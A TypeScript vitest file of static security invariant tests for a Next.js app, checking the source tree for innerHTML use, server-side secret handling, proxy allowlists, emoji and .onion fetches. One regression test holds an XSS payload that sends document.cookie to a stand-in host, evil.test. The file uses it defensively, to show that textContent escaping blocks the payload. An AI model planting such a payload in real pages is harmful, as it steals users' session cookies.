/**
 * The invariants, asserted against the source tree itself.
 *
 * These are static assertions, not behavioural ones, because the properties are
 * structural: "no file does X" cannot be proven by exercising one code path.
 * They are the cheapest possible check and they guard the three things this
 * product cannot afford to get wrong -- INV-2 (the trust boundary), INV-6
 * (escape by construction), INV-7 (no decorative glyphs).
 *
 * They have not run since `aa8789e`.
 *
 * The linter enforces INV-6 too (.eslintrc.js). Two layers on purpose: the
 * linter sees every compiled file but is configurable away per-line, while this
 * walks the tree and counts the exceptions. FINDING-02 was a forgotten call
 * site; a single layer is how it stayed forgotten.
 */
import { describe, it, expect } from "vitest";
import { readFileSync, readdirSync, statSync } from "node:fs";
import { join, relative } from "node:path";

const ROOT = process.cwd();
const SKIP_DIRS = new Set([
  "node_modules",
  ".next",
  "__tests__",
  "__baseline__",
  ".git",
]);

function walk(dir: string, exts: string[], out: string[] = []): string[] {
  for (const entry of readdirSync(dir)) {
    if (SKIP_DIRS.has(entry)) continue;
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) walk(full, exts, out);
    else if (exts.some((e) => entry.endsWith(e))) out.push(full);
  }
  return out;
}

/** Every shipped source file: app, components, lib, middleware. */
const SOURCES = walk(ROOT, [".ts", ".tsx"]).filter(
  (f) => !f.endsWith(".d.ts") && !f.includes("/e2e/")
);

const rel = (f: string) => relative(ROOT, f);
const read = (f: string) => readFileSync(f, "utf8");
/** Source with comments and string-literal contents removed. */
const code = (src: string) =>
  src
    .replace(/\/\*[\s\S]*?\*\//g, "")
    .replace(/^\s*\/\/.*$/gm, "")
    .replace(/(['"`])(?:\\.|(?!\1)[^\\])*\1/g, "''");

describe("the source tree is non-empty", () => {
  it("found the files it is asserting over", () => {
    // Guards against a silent pass if the walk ever stops finding anything --
    // which is precisely the failure mode that hid the missing suite.
    expect(SOURCES.length).toBeGreaterThan(25);
    expect(SOURCES.map(rel)).toContain("lib/report.ts");
    expect(SOURCES.map(rel)).toContain("app/api/engine/[...path]/route.ts");
  });
});

describe("INV-6 - escape by construction", () => {
  it("no file assigns innerHTML or outerHTML", () => {
    const offenders = SOURCES.filter((f) => /\.(inner|outer)HTML\s*=/.test(code(read(f))));
    expect(offenders.map(rel)).toEqual([]);
  });

  it("no file calls document.write", () => {
    const offenders = SOURCES.filter((f) => /document\s*\.\s*write\s*\(/.test(code(read(f))));
    expect(offenders.map(rel)).toEqual([]);
  });

  it("dangerouslySetInnerHTML appears exactly once: the pre-paint skin picker", () => {
    const offenders = SOURCES.filter((f) => code(read(f)).includes("dangerouslySetInnerHTML"));
    // One documented exception, and the exception is where we think it is.
    expect(offenders.map(rel)).toEqual(["app/layout.tsx"]);
  });

  it("the one exception is fed a module constant, not request data", () => {
    const src = read(join(ROOT, "app/layout.tsx"));
    // The only value handed to it is SKIN_PICKER_SCRIPT, a hardcoded constant.
    const uses = src.match(/dangerouslySetInnerHTML=\{\{\s*__html:\s*([A-Za-z_$][\w$]*)/g) ?? [];
    expect(uses.length).toBe(1);
    expect(uses[0]).toContain("SKIN_PICKER_SCRIPT");
  });

  it("the skin picker script itself interpolates only hardcoded module constants", () => {
    const src = read(join(ROOT, "lib/skins.ts"));
    const script = src.slice(src.indexOf("export const SKIN_PICKER_SCRIPT"));
    const interpolations = script.match(/\$\{[^}]*\}/g) ?? [];
    expect(interpolations.length).toBeGreaterThan(0);

    // The script is inlined into <head>, so anything interpolated into it is
    // effectively trusted code. Only these module-level constants may enter --
    // no request data, no storage value, no engine response.
    const ALLOWED = /^\$\{(JSON\.stringify\((SKIN_IDS|LAYOUTS|FONT_PAIRS|STORAGE_KEYS\.\w+)\)|SESSION_VERSION)\}$/;
    const rogue = interpolations.filter((i) => !ALLOWED.test(i));
    expect(rogue).toEqual([]);
  });

  it("the picker's runtime inputs are all validated against the registry", () => {
    // ?skin=, the lock and the restored session record are the three values
    // that come from outside the module. Each is checked before it is applied.
    const src = read(join(ROOT, "lib/skins.ts"));
    for (const guard of [
      "ids.indexOf(forced)>=0",
      "ids.indexOf(lock)>=0",
      "ids.indexOf(o.skin)>=0",
      "layouts.indexOf(o.layout)>=0",
      "fonts.indexOf(o.fontPair)>=0",
    ]) {
      expect(src).toContain(guard);
    }
  });

  /**
   * Proof that the FINDING-02 assertions in report.test.ts are load-bearing.
   *
   * This reproduces the ORIGINAL vulnerable construction and asserts it fails
   * the same checks the fixed path passes. Without this, a future refactor
   * could weaken those assertions and nobody would notice.
   */
  it("the vulnerable construction this replaced would fail these assertions", () => {
    const payload = `<img src=x onerror="fetch('https://evil.test/'+document.cookie)">`;
    const doc = new (require("happy-dom").Window)().document as Document;
    const td = doc.createElement("td");

    // The v1 path: interpolate into markup.
    td.innerHTML = `<span>${payload}</span>`;
    expect(td.querySelectorAll("img").length).toBe(1); // injected

    // The v2 path: textContent.
    const safe = doc.createElement("td");
    safe.textContent = payload;
    expect(safe.querySelectorAll("img").length).toBe(0); // literal text
    expect(safe.textContent).toBe(payload);
  });
});

describe("INV-2 - the browser never holds the engine URL or a key", () => {
  const PROXY = "app/api/engine/[...path]/route.ts";

  it("ENGINE_URL is never prefixed NEXT_PUBLIC_", () => {
    const offenders = SOURCES.filter((f) => read(f).includes("NEXT_PUBLIC_ENGINE_URL"));
    expect(offenders.map(rel)).toEqual([]);
  });

  const ADMIN_PROXY = "app/api/admin/[...path]/route.ts";

  it("ENGINE_URL is read in the two server-side proxies and nowhere else", () => {
    // TWO proxies as of DEC-060, deliberately separate. The read proxy is an
    // allowlist for signed-in analysts; the admin proxy adds role, CSRF,
    // step-up, rate limit and a ledger entry. Merging them would mean one
    // function whose behaviour depends on which arm of a branch it took, and
    // the failure mode of getting that branch wrong is an unauthenticated purge.
    const readers = SOURCES.filter((f) => /process\.env\.ENGINE_URL/.test(read(f)));
    expect(readers.map(rel).sort()).toEqual([ADMIN_PROXY, PROXY].sort());
  });

  it("the read proxy cannot reach the admin scope", () => {
    const src = read(join(ROOT, PROXY));
    const block = src.slice(src.indexOf("const ALLOWED"), src.indexOf("];", src.indexOf("const ALLOWED")));
    expect(block).not.toContain("admin");
  });

  it("every admin request goes through the server-side guard", () => {
    const src = read(join(ROOT, ADMIN_PROXY));
    expect(src).toContain("await guard(req, path)");
    // The guard's refusal must short-circuit before anything is forwarded.
    expect(src).toMatch(/if \(!g\.ok\)\s*\{\s*return refuse\(/);
  });

  it("the admin proxy derives its allowlist from the authorisation table", () => {
    // Deriving rather than restating means a route can never be reachable
    // without a rule, nor have a rule without being reachable. Both mismatches
    // are silent in a hand-maintained pair of lists.
    const src = read(join(ROOT, ADMIN_PROXY));
    expect(src).toContain("ADMIN_ROUTES.map");
  });

  it("the engine authorises independently of the proxy", () => {
    const src = read(join(ROOT, ADMIN_PROXY));
    // A signed, request-bound token, because on Render the engine has its own
    // public URL and cannot assume this proxy is the only caller.
    expect(src).toContain("serviceToken(");
    expect(src).toContain("Authorization");
  });

  it("no secret-bearing module can reach a client bundle", () => {
    // `server-only` is aliased away in vitest (it has no runtime behaviour), so
    // the guarantee is asserted here and enforced by `next build`.
    for (const f of ["lib/totp.ts", "lib/totpStore.ts", "lib/passwords.ts", "lib/serviceToken.ts", "lib/sessions.ts", "lib/adminGuard.ts"]) {
      expect(read(join(ROOT, f)), f).toContain('import "server-only"');
    }
  });

  it("no client component reads a secret from the environment", () => {
    const clientFiles = SOURCES.filter((f) => /^["']use client["']/m.test(read(f)));
    expect(clientFiles.length).toBeGreaterThan(0);
    const leaks = clientFiles.filter((f) =>
      /process\.env\.(?!NEXT_PUBLIC_)[A-Z_]+/.test(code(read(f)))
    );
    expect(leaks.map(rel)).toEqual([]);
  });

  it("every NEXT_PUBLIC_ variable is one we deliberately made public", () => {
    const names = new Set<string>();
    for (const f of SOURCES) {
      for (const m of read(f).matchAll(/process\.env\.(NEXT_PUBLIC_[A-Z0-9_]+)/g)) {
        names.add(m[1]);
      }
    }
    /**
     * A pinned list, so adding one is a deliberate, reviewed act.
     *
     * Two kinds are permitted and nothing else:
     *
     *   FF_*     feature flags. A flag NAME is not a secret, and the flag has
     *            to be readable in the client bundle to decide which tree
     *            renders.
     *   BUILD_*  build identity (DEC-063). A commit SHA is in the public
     *            repository and the environment name is visible from the URL;
     *            both must render in a footer the browser draws.
     *
     * Anything else appearing here is a leak, and this test is what makes that
     * visible rather than silent.
     */
    expect([...names].sort()).toEqual([
      "NEXT_PUBLIC_BUILD_ENV",
      "NEXT_PUBLIC_BUILD_SHA",
      "NEXT_PUBLIC_BUILD_VERSION",
      "NEXT_PUBLIC_FF_COMMAND",
      "NEXT_PUBLIC_FF_GRAPH_LAB",
      "NEXT_PUBLIC_FF_SANGAM_PRO",
      "NEXT_PUBLIC_FF_WORKSPACE",
      "NEXT_PUBLIC_RENDER_GIT_COMMIT",
      "NEXT_PUBLIC_VERCEL_GIT_COMMIT_SHA",
    ]);
  });

  it("no NEXT_PUBLIC_ variable names a secret", () => {
    // The pinned list above catches additions; this catches the SHAPE of a
    // mistake, so a variable called NEXT_PUBLIC_API_KEY fails loudly even if
    // someone updates the list without thinking.
    const names = new Set<string>();
    for (const f of SOURCES) {
      for (const m of read(f).matchAll(/process\.env\.(NEXT_PUBLIC_[A-Z0-9_]+)/g)) {
        names.add(m[1]);
      }
    }
    const suspicious = [...names].filter((n) =>
      /SECRET|KEY|TOKEN|PASSWORD|PEPPER|CREDENTIAL|PRIVATE/.test(n)
    );
    expect(suspicious).toEqual([]);
  });

  it("the proxy is an allowlist, not a passthrough", () => {
    const src = read(join(ROOT, PROXY));
    expect(src).toMatch(/const ALLOWED\s*=\s*\[/);
    // The check must gate the forward, and reject by default.
    expect(src).toMatch(/if\s*\(!isAllowed\(path\)\)/);
    expect(src).toMatch(/ALLOWED\.includes\(/);
  });

  it("the allowlist is exactly what is reviewed today", () => {
    const src = read(join(ROOT, PROXY));
    const block = src.slice(src.indexOf("const ALLOWED"), src.indexOf("];", src.indexOf("const ALLOWED")));
    const entries = [...block.matchAll(/"([a-z0-9_-]+)"/g)].map((m) => m[1]).sort();
    // Extending the trust boundary must be a deliberate, reviewed act -- so it
    // breaks this test and someone has to update it on purpose.
    expect(entries).toEqual([
      "actor", "actors", "audit", "behaviour", "chain", "compare", "export",
      "extract", "feed", "fusion", "geo", "graph", "health", "infra",
      "rebrand", "sources", "style", "tor", "version",
    ]);
  });

  it("no admin scope is reachable through the proxy yet (Phase 4 adds it deliberately)", () => {
    const src = read(join(ROOT, PROXY));
    const block = src.slice(src.indexOf("const ALLOWED"), src.indexOf("];", src.indexOf("const ALLOWED")));
    expect(block).not.toContain("admin");
  });
});

describe("INV-7 - no emoji, no decorative glyphs in rendered UI", () => {
  // DEC-002 widened the grep so the automated and manual layers test one rule.
  const BANNED = /[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\u{2B00}-\u{2BFF}]/u;
  const DECORATIVE = /[✓✔✗✘⚠↳]/u;

  it("no shipped source contains a pictographic emoji", () => {
    const offenders = SOURCES.filter((f) => BANNED.test(read(f))).map(rel);
    expect(offenders).toEqual([]);
  });

  it("no shipped source uses a check, cross, warning or hook glyph as an icon", () => {
    const offenders = SOURCES.filter((f) => DECORATIVE.test(read(f))).map(rel);
    expect(offenders).toEqual([]);
  });

  it("icons come from lucide-react", () => {
    const withIcons = SOURCES.filter((f) => read(f).includes("lucide-react"));
    expect(withIcons.length).toBeGreaterThan(5);
  });
});

describe("INV-1 - no code path resolves a .onion host", () => {
  it("the web layer never constructs a .onion URL to fetch", () => {
    const offenders = SOURCES.filter((f) => /fetch\([^)]*\.onion/.test(code(read(f))));
    expect(offenders.map(rel)).toEqual([]);
  });
});
